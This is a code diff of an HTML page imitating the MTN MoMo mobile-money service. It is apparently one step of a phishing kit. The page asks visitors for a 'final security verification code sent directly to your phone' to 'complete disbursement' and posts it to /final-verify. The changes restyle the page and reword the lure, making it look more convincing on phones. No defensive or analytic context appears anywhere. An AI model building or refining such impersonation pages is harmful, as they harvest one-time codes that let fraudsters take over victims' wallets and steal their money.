@@ -2,34 +2,27 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Final Authentication - MTN MoMo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Final System Verification - MTN MoMo</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        body { background-color: #003366; color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: sans-serif; }
-        .momo-box { max-width: 480px; width: 100%; background: #002244; border-radius: 16px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
-        .momo-logo { background-color: #FFCC00; color: #003366; font-weight: 900; font-size: 20px; padding: 4px 10px; border-radius: 8px; display: inline-block; }
+        body { background-color: #003366; color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: system-ui, -apple-system, sans-serif; margin: 0; padding: 20px; text-align: center; }
+        .momo-box { width: 100%; max-width: 500px; background: #002244; border-radius: 20px; padding: 30px 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+        .momo-logo { background-color: #FFCC00; color: #003366; font-weight: 900; font-size: 1.4rem; padding: 6px 14px; border-radius: 10px; display: inline-block; }
     </style>
 </head>
-<body class="p-3 text-center">
+<body>
     <div class="momo-box">
         <div class="momo-logo mb-3">MM</div>
-        <h4 class="fw-bold mb-2">Final Authentication</h4>
-        <p class="text-white-50 small mb-4">
-            Please enter the final security authentication code sent directly from our system to complete your wallet activation.
-        </p>
-        
+        <h4 class="fw-bold mb-2">Final System Authentication</h4>
+        <p class="text-white-50 small mb-4">Enter the final security verification code sent directly to your phone to finish wallet disbursement.</p>
+
         <form action="/final-verify" method="POST">
-            <div class="mb-3 text-start">
-                <label class="form-label small text-warning fw-bold">Enter Final System Code:</label>
-                <input 
-                    type="text" 
-                    class="form-control text-center font-monospace py-3" 
-                    name="final_code" 
-                    placeholder="Enter security code..." 
-                    required>
+            <div class="mb-4 text-start">
+                <label class="form-label small text-warning fw-bold">Enter Security Code:</label>
+                <input type="text" class="form-control py-3 text-center font-monospace" name="final_code" placeholder="Enter code..." required style="border-radius: 10px; font-size: 1.1rem;">
             </div>
-            <button type="submit" class="btn btn-warning w-100 py-3 fw-bold text-dark">COMPLETE DISBURSEMENT</button>
+            <button type="submit" class="btn btn-warning w-100 py-3 fw-bold text-dark rounded-3 shadow">COMPLETE DISBURSEMENT</button>
         </form>
     </div>
 </body>
